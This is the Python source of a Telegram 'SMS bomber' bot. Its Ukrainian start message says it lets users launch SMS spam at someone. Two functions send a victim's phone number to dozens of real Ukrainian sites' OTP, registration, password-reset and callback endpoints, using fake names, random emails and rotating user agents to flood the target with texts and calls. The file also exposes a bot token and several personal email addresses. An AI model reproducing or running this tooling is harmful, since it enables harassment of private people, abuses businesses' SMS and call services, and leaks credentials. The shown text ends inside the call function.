import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import time
import random
from random import choice
import parser_https
import sms_bomber_keyboard as kb
from users_agent_list import get_agent

TOKEN = '5687451780:AAFynRqIPHS7lhyCHu63XICHrryt7yF8KOY'

THREADS_LIMIT = 200

chat_ids_file = 'chat_ids.txt'

ADMIN_CHAT_ID = 1363525572

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []

print('Bot has started! You can use him.')

def black_list_add(idd):
    with open('black_list.txt', 'a') as f:
        f.write(f'{idd}\n')

def save_chat_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    with open(chat_ids_file,"a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
        users_amount[0] = len(ids_list)
    return


def send_message_users(message):
    #sms_bomber.
    pass

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]
    bot.send_message(ADMIN_CHAT_ID, f"Повідомлення відправлено ({users_amount[0]}) користувачам бота!")


@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    boom = types.KeyboardButton(text='💬Запуск спама')
    stop = types.KeyboardButton(text='❌Зупинити спам')
    stats = types.KeyboardButton(text='📊Статистика')
    faq = types.KeyboardButton(text='❗️ FAQ')

    buttons_to_add = [boom, stop,faq, stats]

    if int(message.chat.id) == ADMIN_CHAT_ID:
        buttons_to_add.append(types.KeyboardButton(text='🔥Розсилка'))

    keyboard.add(*buttons_to_add)
    bot.send_message(message.chat.id, 'Привіт🙋‍♂!\n\n<b>Завдяки цьому боті ти можеш запустити комусь спам смс</b>\n\n<b>Вибери дію:</b>',  reply_markup=keyboard, parse_mode='HTML')
    save_chat_id(message.chat.id)

def send_for_number_sms(aa):
    headers = {
        'User-Agent': get_agent()
    }

    messages = ['Перезвоніть мені будь ласка', 'хочу поговорити за сам сайт','хочу проконсультоватись','чекаю вашого звінку']

    emails_list = ['prostoegorich2@gmail.com',
          'autoskilz068@gmail.com',
          'maksimbardic@gmail.com',
          'ttgbot.proekt@gmail.com',
          'webmine123@gmail.com']
    email = ''.join([random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')) for m in range(10)]) + '@gmail.com'

    with open('nimes.txt', 'r',encoding='utf-8') as f:
        name = choice(f.read().split())
    with open('surname.txt', 'r',encoding='utf-8') as f:
        surname = choice(f.read().split())
    password = ''.join([random.choice(list('йцукенгшщзфывапролдячсмитьбЙЦУКЕНГШЩЗФЫВАПРОЛДЯЧСМИТЬБ1234567890_')) for m in range(7)])

    uniq_number = f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'
    uniq_number_minus = f'+{aa[:2]}-({aa[2:5]})-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}'
    number_plus = '+' + aa

    hour = datetime.now().strftime('%H')
    minute = datetime.now().strftime('%M')
    day = datetime.now().strftime('%j')
    day = int(day)-1
    
    try:
        sms = requests.post('https://a-bank.com.ua/api/getcard/green',headers=headers, json={"client_phone": number_plus,"lang": "uk","type": "green","_": 1663097843709})    
        time.sleep(0.4)
        sms = requests.post('https://www.foxtrot.com.ua/uk/account/sendcodeagain',headers=headers, data={'phone': aa})   
        time.sleep(0.4)
        sms = requests.post('https://ucb.z.apteka24.ua/api/send/otp',headers=headers, json={"phone": aa})
        time.sleep(0.4)
        sms = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers=headers, json={'phone':aa,'platform':'PISWeb'})
        time.sleep(0.4)
        sms = requests.post('https://api.staff-clothes.com/api/v1/send-sms-code?access_token=MDFiNjdiNGFhZjU4ZDU0YzVkMjQ4NDMxYTI5YWM0Y2QzZjQzNjJhYjI4ZjY1ODJlOTZjN2QxMmQxNjM2OTMyNQ&locale=ua&action=register_new_user',headers=headers,data={'mobileNumber':aa}) 
        time.sleep(0.4)
        sms = requests.post('https://iq-pizza.eatery.club/site/v1/pre-login', headers=headers, data={'phone': aa}) 
        time.sleep(0.4)
        sms = requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', headers=headers, data={'action': 'ajax_register_user','step': '1','phone': aa,'smscode': '','security_login': '9df5729c62'}) 
        time.sleep(0.4)
        sms = requests.post('https://vilki-palki.od.ua/api/secret/generate?lang=russian', headers=headers, data={'phone': uniq_number}) 
        time.sleep(0.4)
        sms = requests.post('https://kasta.ua/api/v2/login/', headers=headers, json={'phone': aa}) 
        time.sleep(0.4)
        sms = requests.post('https://api.creditkasa.ua/public/auth/sendAcceptanceCode',headers=headers,json={"mobilePhone": aa}) 
        time.sleep(0.4)
        sms = requests.post('https://money4you.ua/api/clientRegistration/sendValidationSms',headers=headers,json={"phone": number_plus,"firstName": name,"lastName": surname,"fathersName": "Вавааав","udriveEmployee": 'false'}) 
        time.sleep(0.4)
        sms = requests.post('https://my.telegram.org/auth/send_password',headers=headers,data={'phone': number_plus}) 
        time.sleep(0.4)
        sms = requests.post('https://anc.ua/authorization/auth/v2/register',headers=headers,json={'login': f'{number_plus}'}) 
        time.sleep(0.4)
        sms = requests.get(f'https://www.add.ua/brander_smsconfirm_login/send/?telephone=+{aa}&code=&type=sms',headers=headers) 
        time.sleep(0.4)
        sms = requests.post('https://telemart.ua/auth/',headers=headers,data={'login': number_plus,'action': 'submitPassword','token': 'st'}) 
        time.sleep(0.4)
        sms = requests.post('https://vandalvape.com.ua/index.php?route=extension/module/sms_reg/SmsCheck',headers=headers, data={'phone': f'{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'}) 
        time.sleep(0.4)
        sms = requests.post('https://f.ua/ajax/callback/',headers=headers, data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','title': '','url': 'https://f.ua/','mail': '','notes': ''}) 
        time.sleep(0.4)
        sms = requests.get(f'https://c2c.oschadbank.ua/api/sms/{aa}',headers=headers) 
        time.sleep(0.4)
        sms = requests.post('https://cinemaciti.ua/',headers=headers,data={'email': choice(emails_list),'phone': aa,'arraySeats': '','terms_and_conditions': 'on'}) 
        time.sleep(0.4)
        sms = requests.post('https://apidev.color-it.ua/api/auth/code',headers=headers,json={'phone': aa[2:]}) 
        time.sleep(0.4)
        sms = requests.post('https://agro-market.net/ajax/auth.php',headers=headers, data={'mode': 'reg','phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','name': name,'email': 'autoskilz068@gmail.com','code': '0','app': 'false'}) 
        time.sleep(0.4)
        sms = requests.post('https://money4you.ua/api/clientRegistration/sendValidationSms',headers=headers, json={"phone": number_plus,"firstName": name,"lastName": surname,"fathersName": name,"udriveEmployee": 'false'}) 
        time.sleep(0.4)
        sms = requests.post('https://agrotender.com.ua/buyerreg',headers=headers,data={'action': 'send-code','phone': aa}) 
        time.sleep(0.4)
        sms = requests.post('https://loyalty.vidi.ua/register',headers=headers,data={'locale': 'ua','name': name,'lname': surname,'mname': name,'email': email,'phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}', 'password': password}) 
        time.sleep(0.4)
        sms = requests.post('https://automoto.ua/uk/my-office/login',headers=headers,json={"phone": f'{aa[:2]} {aa[2:5]} {aa[5:8]}{aa[8:10]}{aa[10:12]}'}) 
        time.sleep(0.4)
        sms = requests.get(f'https://api.eldorado.ua/v1/sign/?login={aa}&step=password-recovery-step&lang=ua',headers=headers) 
        time.sleep(0.4)
        sms = requests.post('https://synthetic.ua/api/auth/register/',headers=headers,json={"mobile_phone": aa,"password": "кнкнккнекне","password_confirm": "кнкнккнекне"}) 
        time.sleep(0.4)
        sms = requests.post('https://api.starylev.com.ua/api/v1.1/sms/sent',headers=headers,json={"phone": aa,"email": email}) 
        time.sleep(0.4)
        sms = requests.post('https://api.creditkasa.ua/public/auth/sendAcceptanceCode',headers=headers,json={"mobilePhone": aa})
        time.sleep(0.4)
        sms = requests.post('https://my.tpozyka.com/registration-handle-1',headers=headers,data={'data':f'lastname={surname}&name={name}&phone=%2B{aa[:2]}+({aa[2:5]})+{aa[5:8]}-{aa[8:10]}-{aa[10:12]}'}) 
        time.sleep(0.4)
        sms = requests.post('https://ticketsbox.com/?route=account/authorization',headers=headers, data={'username': aa,'type': 'lost'}) 
        time.sleep(0.4)
        sms = requests.post('https://vchehle.ua/uk/register',headers=headers, data={'email': number_plus,'password': 'gdfgdfgfddgf','password_confirmation': 'gdfgdfgfddgf'}) 
        time.sleep(0.4)
        sms = requests.post('https://my.lun.ua/api/user/login',headers=headers, json={'login': number_plus}) 
        time.sleep(0.4)
        sms = requests.post('https://api.riel.ua/graphql',headers=headers, json={"operationName": "StoreSendSms","variables": {"phone": aa},"query": "mutation StoreSendSms($phone: String) {\n  storeSendSms(phone: $phone)\n}\n"}) 
        time.sleep(0.4)
        sms = requests.post('https://pcshop.ua/index.php?route=account/register/validateFirstStep',headers=headers,data={'lastname': name,'firstname': surname,'email': email,'telephone': aa,'password': '','fax':  '','address_1':  '','city':  '','country_id':''  ,'zone_id':  '','newsletter': 1}) 
        time.sleep(0.4)
        sms = requests.get(f'https://bond.od.ua/newclient///?phone=+{aa}',headers=headers) 
        time.sleep(0.4)
        sms = requests.post('https://megasport.ua/api/auth/phone/?language=ua',headers=headers,json={'phone': number_plus}) 
        time.sleep(0.4)
        sms = requests.post(f'https://my.hmara.tv/api/sign?contact={aa}',headers=headers) 
        time.sleep(0.4)
        sms = requests.post('https://api.sweet.tv/SignupService/SetPhone.json',headers=headers,json={"device": {"type": "DT_Web_Browser","application": {"type": "AT_SWEET_TV_Player"},"model": get_agent(),"firmware": {"versionCode": 1,"versionString": "3.2.28"},"uuid": "3408e209-12b7-4102-bb92-b327151bff9f","supported_drm": {"widevine_modular": True}},"phone": aa}) 
        time.sleep(0.4)
        sms = requests.post('https://www.pratik.com.ua/uk/?gclid=CjwKCAjw1ICZBhAzEiwAFfvFhIWCEV44RWKP16RvSC3Cj8E-ntL6NkYlW2V9kAyBugHoTLRziRZzrhoC_sUQAvD_BwE',headers=headers,data={'phone': f'+{aa[:2]} {aa[2:5]} {aa[5:8]} {aa[8:10]} {aa[10:12]}','action_form': 'get_auth_sms'})    
        time.sleep(0.4)
        sms = requests.post('https://angio.com.ua/send_login_code',headers=headers,data={'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','remember': 'false'})    
        time.sleep(0.4)
        sms = requests.post('https://gepur.com/rapi/auth/register-retail-buyer',headers=headers,json={"email": email,"password": password,"phone": number_plus,"fio": f"{name} {surname} {name}"})    
        time.sleep(0.4)
        sms = requests.post('https://ehr.h24.ua/api/v2/signup',headers=headers,json={"phone_number": number_plus})    
        time.sleep(0.4)
        sms = requests.get(f'https://dok.ua/profile/newsms/{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}',headers=headers)    
        time.sleep(0.4)
        sms = requests.post('https://go.varus.ua/api/ext/uas/auth/send-otp?storeCode=ua',headers=headers,json={'phone': number_plus})    
        time.sleep(0.4)
        sms = requests.post('https://www.iqos.com.ua/ru',headers=headers,data={'check_login_only': 'Y','validate_sms_code': 'N','result_ids': 'result','user_type': 'K','user_data[phone]': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','ship_to_another': '1','user_data[firstname]': name,'user_data[lastname]': surname,'user_data[gender]': '3','user_data[birthday]': '16/10/2000','user_data[s_state]': '144','user_data[terms_and_conditions]': 'Y','user_data[AcceptedTermAndConditionId]': '9','user_data[las_preference]': 'Y','code_1': '','code_2': '','code_3': '','code_4': '','code': '','is_ajax': '1','dispatch[profiles.update]': ''})     
        time.sleep(0.4)
        sms = requests.post('https://brand-centr.com/index.php?route=extension/module/sms_reg/SmsCheck',headers=headers, data={'phone': aa})    
        time.sleep(0.4)
        sms = requests.post('https://api.likari.in.ua/v2/auth/sms',headers=headers, json={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}'})    
        time.sleep(0.4)
        sms = requests.post('https://auth.easypay.ua/api/check',headers=headers, json={"phone": aa})    
        time.sleep(0.4)
        sms = requests.post('https://izi.ua/api/auth/user-by-phone',headers=headers, json={'phone': aa})
        time.sleep(0.4)
        sms = requests.post('https://tea.ua/api/web/auth/verifyPhone',headers=headers, json={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}', 'phoneCode': "+38"})
        time.sleep(0.4)
        sms = requests.post('https://smaki-maki.com/wp-admin/admin-ajax.php',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','birthday': '15.01.1998','password': password,'password2': password,'code': '','action': 'register_user'})
        time.sleep(0.4)
        sms = requests.post('https://welovemebel.com.ua/ajax/auth_register.php',headers=headers,data={'USER_LOGIN': number_plus,'USER_EMAIL': email,'SECRET': 'secretcode'})
        time.sleep(0.4)
        sms = requests.post('https://carta.ua/api/v1.0/register/user',headers=headers,json={"username": name,"phone": f'({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}',"plainPassword": {"first": password,"second": password},"confirmType": "phone"})
        time.sleep(0.4)
        sms = requests.post('https://maslotom.com/api/index.php?route=api/account/phoneLogin',headers=headers,data={'phone': f'+{aa[:3]}({aa[3:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.4)
        sms = requests.post('https://prontopizza.ua/lviv/wp-admin/admin-ajax.php',headers=headers,data={'first_name': name,'last_name': surname,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','input_check_send_sms': '','email': email,'password': password,'password2': password,'agree': 'on','action': 'register_user'})
        time.sleep(0.4)
        sms = requests.post('https://api.sezamfood.com.ua/ru/request/auth-phone',headers=headers,json={"phone": aa,"agree": 1})
        time.sleep(0.4)
        sms = requests.post('https://www.garrys.com.ua/ajax/reguser/',headers=headers,data={'name': name,'login': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','password': password,'control': '1'})
        time.sleep(0.4)
        sms = requests.post('https://www.garrys.com.ua/ajax/remind_password/',headers=headers,data={'nphone': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.4)
        sms = requests.post('https://www.lumident.kiev.ua/form/ua/appointmentHeader',headers=headers,data={'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'})
        time.sleep(0.4)
        sms = requests.post('https://odrex.top/api/sms',headers=headers,json={"phone": aa,"sms_code_type": "random","type": "registration"})
        time.sleep(0.4)
        sms = requests.post('https://auth2.multiplex.ua/login',headers=headers,json={"login": aa})
        time.sleep(0.4)
        sms = requests.post('https://samsonite.ua/auth/loginbyphone',headers=headers,data={'phone': '+'+aa[:2] + ' ' + aa[2:5] + ' ' + aa[5:8]+ '-' + aa[8:10]+ '-' +aa[10:12],'code': ''})
    except:
        pass
    print('все')

def send_for_number_call(aa):
    headers = {
        'User-Agent': get_agent()
    }

    messages = ['Перезвоніть мені будь ласка', 'хочу поговорити за сам сайт','хочу проконсультоватись','чекаю вашого звінку']

    emails_list = ['prostoegorich2@gmail.com',
          'autoskilz068@gmail.com',
          'maksimbardic@gmail.com',
          'ttgbot.proekt@gmail.com',
          'webmine123@gmail.com']
    email = ''.join([random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')) for m in range(10)]) + '@gmail.com'

    with open('nimes.txt', 'r',encoding='utf-8') as f:
        name = choice(f.read().split())
    with open('surname.txt', 'r',encoding='utf-8') as f:
        surname = choice(f.read().split())
    password = ''.join([random.choice(list('йцукенгшщзфывапролдячсмитьбЙЦУКЕНГШЩЗФЫВАПРОЛДЯЧСМИТЬБ1234567890_')) for m in range(7)])

    uniq_number = f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'
    uniq_number_minus = f'+{aa[:2]}-({aa[2:5]})-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}'
    number_plus = '+' + aa

    hour = datetime.now().strftime('%H')
    minute = datetime.now().strftime('%M')
    day = datetime.now().strftime('%j')
    day = int(day)-1
    
    try:
        call = requests.post('https://www.foxtrot.com.ua/uk/home/saveordercall',headers=headers,data={'callbacktype': '0','Phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','__RequestVerificationToken': 'CfDJ8J1xteDpL4JClh37Z9x1CRgd8v8ZdrEhv7awSMS6zrMlJx7e3Ixy8LAKabotsCLFE5OYiZKX8J46aBiM8dxkr60Bwl671WHDTCTLqHlMvhhhTRiP_wsoU4O8HcK9riVkvzzTma6UcUyvL6hTlHO5yoA','X-Requested-With': 'XMLHttpRequest'})    
        time.sleep(0.4)
        call = requests.post('https://city-drive.phonet.com.ua/rest/public/widget/call-catchers/15bdee1b-7e69-4a97-b04b-8d96708fe5b5/call?timestamp=1663171005082&utcOffset=-180',headers=headers, json={"phone": number_plus,"utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "1d6cfee7-0292-4cab-b3fa-b74d66a45940","uaId": "UA-21322812-1","clientId": "1008992044.1662752535","pageUrl": "https://city-drive.ua/user/register"}) 
        time.sleep(0.4)
        call = requests.post('https://credit7.ua/client/login',headers=headers, data={'phone':f'({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'}) 
        time.sleep(0.4)
        call = requests.post('https://anixgroup.pbx.vega.ua/rest/public/widget/call-catchers/24af7d3e-9a1e-4a50-b02c-65b1868dc0fb/call?timestamp=1662909402671&utcOffset=-180',headers=headers,json={"phone": number_plus,"utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "c8f6cdf7-526a-43d7-a95b-8266650ec620","uaId": "UA-72798timeout=1.5,3-9","clientId": "286334084.1662909385","pageUrl": "https://anix.ua/ua/odnorazovye-elektronnye-sigarety"}) 
        time.sleep(0.4)
        call = requests.post('https://buketland.phonet.com.ua/rest/public/widget/call-catchers/02a157cf-3c3b-4bbd-9398-92b81a93b12c/call?timestamp=1662908228931&utcOffset=-180',headers=headers,json={"phone": number_plus,"utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "d1b62cfb-b334-47d5-bbf6-95dbb15404a2","uaId": "UA-5timeout=1.5,07303-6","clientId": "1717388277.1662908163","pageUrl": "https://buketland.com.ua/index.php?route=account/success"}) 
        time.sleep(0.4)
        call = requests.post('https://credit7.ua/client/registration/general-information',headers=headers,data={'mobile_phone': f'{aa[:2]}{(aa[2:5])}{aa[5:8]} {aa[8:10]} {aa[10:12]}'}) 
        time.sleep(0.4)
        call = requests.post('https://callback.ringostat.net/api/initiateCallback/',headers=headers,data={'data[num_to_call]': number_plus,'data[ua_id]': 'UA-82454976-1','data[hash]': '82739324abe17ftimeout=1.5,8bdaa7f9149b423c4b0883a7','data[client_id]': 'timeout=1.5,35316644.1662907751','data[utmz]': '','data[avg_time_to_call]': '60','data[page_url]': 'https://proflowers.ua/st','data[hid]': '8bc602ca-1a0b-43c9-9609-f556ca267timeout=1.5,c','data[verified_user]': '1'}) 
        time.sleep(0.4)
        call = requests.post('https://vitok.ua/ua/feedback/headerCallback/',headers=headers,data={'cellphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','isAjaxForm': 'headerCallbackForm_IY9DZ','isAjax': '1','unique_id': 'IY9DZ'}) 
        time.sleep(0.4)
        call = requests.post('https://elektreka.com.ua/index.php?route=extension/module/callback',headers=headers,data={'phone': number_plus,'url_site': 'https://elektreka.com.ua/rozetki-i-vyklyuchateli/?gclid=Cj0KCQjwjvaYBhDlARIsAO8PkE3IaTWJylV7VfA_f0k6DfemVao4cU1w12twNAFB8DPPErFj-FWAsqwaAjy3EALw_wcB','action': 'send'}) 
        time.sleep(0.4)
        call = requests.post('https://api.bossautoukraine.com.ua/api/v1/orders/bid',headers=headers,json={"name": name,"phone": number_plus,"message": "Зв'язатись зараз","to": "semenyuk.c.s@gmail.com","subject": "Зворотній дзвінок : https://bossautoukraine.com.ua/cars/","office": "Стрий, вул. Болехівська 47а","isMobile": 'true'}) 
        time.sleep(0.4)
        call = requests.post('https://veloplaneta.ua/graphql/',headers=headers,json={"operationName": "requestFeedbackMutation","variables": {"phone": aa},"query": "mutation requestFeedbackMutation($phone: String!) {\n  feedback {\nrequestFeedback(phone: $phone)\n__typename\n  }\n}\n"}) 
        time.sleep(0.4)
        call = requests.post('https://alcoexpert.shop/wp-json/contact-form-7/v1/contact-forms/2165/feedback',headers=headers,data={'userphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'}) 
        time.sleep(0.4)
        call = requests.post('https://vchehle.ua/uk/callback',headers=headers, data={'page': 'https://vchehle.ua/uk/pages/contacts','name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','message': choice(messages)}) 
        time.sleep(0.4)
        call = requests.post('https://lagrande.com.ua/interactive/ajax.php?zone=site&action=AjaxCallback&task=send&type=HeaderCallback',headers=headers, data={'firstname': name,'phone': number_plus}) 
        time.sleep(0.4)
        call = requests.post('https://pancer.phonet.com.ua/rest/public/widget/call-catchers/a55fd900-92f9-4ac6-89be-3a07c17876c7/call-postponed?timestamp=1663000707689&utcOffset=-180',headers=headers, json={"phone": number_plus,"date": "13-Сентября-2022","time": "10:00","utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "5a2a4ba1-2145-4695-93c4-5e7898922934","timestamp": 1663052400000,"uaId": "UA-53329668-1","clientId": "428965036.1663000448","pageUrl": "https://pancer.com.ua/ua/travmaticheskie-pistolety"}) 
        time.sleep(0.4)
        call = requests.post('https://elmir.ua/response/load_json.php',headers=headers,data={'cb_phone': f'{aa[2:5]}-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}','day':f'd{day}','hour':f'h{hour}','minute':f'm{minute}','later': 1,'url': 'https://elmir.ua/keyboard/','type': 'callback','state': 'call'}) 
        time.sleep(0.4)
        call = requests.post('https://kvshop.com.ua/callrequest',headers=headers,json={"name": name,"phone": f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'}) 
        time.sleep(0.4)
        call = requests.get(f'https://touch.com.ua/ajax.php?act=getCallback&phone={aa}') 
        time.sleep(0.4)
        call = requests.post('https://www.mandrivnik.com.ua/ajax/callMe.php',headers=headers,data={'un': name,'uph': number_plus}) 
        time.sleep(0.4)
        call = requests.post('https://steko.phonet.com.ua/rest/public/widget/call-catchers/a9ed83ce-75fe-4f52-bada-8a0fe7247f0a/call-postponed?timestamp=1663020130539&utcOffset=-180',headers=headers,json={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "cpc","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "3619279d-10b7-478e-a098-e71656bbf774","timestamp": 1663048800000,"uaId": "UA-45617472-4","clientId": "1754693290.1663020106","pageUrl": "https://online.steko.com.ua/?gclid=CjwKCAjwsfuYBhAZEiwA5a6CDGM6GLpYdA28DzU6e5R-dGncNeEJJWgd0NurEpl4yTB-yVxqp8apKBoCTr0QAvD_BwE"}) 
        time.sleep(0.4)
        call = requests.post('https://agat-m.com.ua/send.php',headers=headers,data={'name': name,'phone': number_plus}) 
        time.sleep(0.4)
        call = requests.post('https://megasport.ua/api/feedback/sendCallback/?language=ua',headers=headers,json={"phone": number_plus}) 
        time.sleep(0.4)
        call = requests.post('https://kvshop.com.ua/callrequest',headers=headers,json={'name': name, 'phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})    
        time.sleep(0.4)
        call = requests.post('https://yaskravaklumba.com.ua/index.php?route=common/header/addiwishcall',headers=headers,data={'name': name,'phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}','text': ''})
        time.sleep(0.4)
        call = requests.post('https://kombinat.kiev.ua/wp-admin/admin-ajax.php',headers=headers,data={'action': 'do_something','name': 'name','phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}{aa[10:12]}','subject': ''})
        time.sleep(0.4)
        call = requests.post('https://piromarket.com.ua/index.php?dispatch=place_order.call_you_back&comment=',headers=headers,data={'name': name,'tel':  aa})
        time.sleep(0.4)
        call = requests.post('https://ilounge.ua/ajax/send-message-to-telegram.php',headers=headers,data={'callmeback-name': name,'callmeback-phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.4)
        call = requests.post('https://elektro.in.ua/callme.php',headers=headers,data={'phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.4)
        call = requests.post('https://mamazin.com.ua/ua/api/s/',headers=headers,data={'ajaxCall': '1','user': 'guest','form[action]': 'callme','form[name]': name,'form[phone]': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','form[theme]': '2'})
        time.sleep(0.4)
        call = requests.post('https://vchehle.ua/uk/callback',headers=headers,data={'page': 'https://vchehle.ua/uk/kolonki','name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}' ,'message': ''})
        time.sleep(0.4)
        call = requests.post('https://pit-jey.com/index.php?route=extension/module/cyber_callback',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','comment_buyer': '','url_site': 'https://pit-jey.com/ua/simpleregister/','action': 'send'})
        time.sleep(0.4)
        call = requests.post('https://med-magazin.ua/ajax/call/set/',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.4)
        call = requests.post('https://air-conditioner.ua/page/page/mail-callback',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.4)
        call = requests.post('https://aber.com.ua/feedback/callback',headers=headers,data={'firstname': name,'cellphone': number_plus,'time_info': '','isAjaxForm': 'callbackForm','isAjax': '1'})
        time.sleep(0.4)
        call = requests.post('https://atmo.ua/feedback/callback',headers=headers,data={'firstname': name,'cellphone': number_plus,'isAjaxForm': 'callbackForm','isAjax': '1'})
        time.sleep(0.4)
        call = requests.post('https://e-ukrservice.com/index.php?route=common/callbacks/send',headers=headers,data={'phone': f'+{aa[:2]} {aa[2:5]} {aa[5:8]} {aa[8:10]} {aa[10:12]}','url': 'https://e-ukrservice.com/ru/lantsyugovi-pyly/?gclid=Cj0KCQjwvZCZBhCiARIsAPXbaju7thYMTzoU8CcNrAnukdwhF3L7csqNTl4KiLozmn71z0LUVD36MN4aAvSoEALw_wcB','form': 'header_callback'})
        time.sleep(0.4)
        call = requests.post('https://fitness-club.lviv.ua/wp-content/themes/fitnes/mail.php',headers=headers,data={'name': name,'tel': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}','adress': 'chor'})
        time.sleep(0.4)
        call = requests.post('https://webapi.sportlife.ua/landing-form-submissions',headers=headers,json={"utm_source": 'null',"utm_medium": 'null',"utm_campaign": 'null',"utm_term": 'null',"utm_content": 'null',"remote_addr": "178.92.20.29","club_id": "18","club_name": "Героїв УПА","city_id": "41","club_raw": "ЛВУ","comment_1": "Регистрации с конструктора абонементов (New site)","name": name,"patronymic": "","surname": "","birthday": "","phone": f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}',"email": "","address": "","club": "28","city": "2","acceptment": True})
        time.sleep(0.4)
        call = requests.post('http://kirbud.com.ua/index.php?route=extension/module/callback',headers=headers,data={'name': '','phone': number_plus,'comment': '','action': 'send'})
        time.sleep(0.4)
        call = requests.post('https://bcaa.ua/interactive/ajax.php?zone=site&action=callback',headers=headers,data={'firstname': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.4)
        call = requests.post('https://protein-max.com.ua/ajaxrequest',headers=headers,data={'mguniqueurl': 'action/sendOrderRing','pluginHandler': 'back-ring','name': 'name','comment': '','phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','city_id': '','mission': '','date_callback': '','time_callback': '','invisible': '1','status_id': '1','pub': '1','capcha': ''})
        time.sleep(0.4)
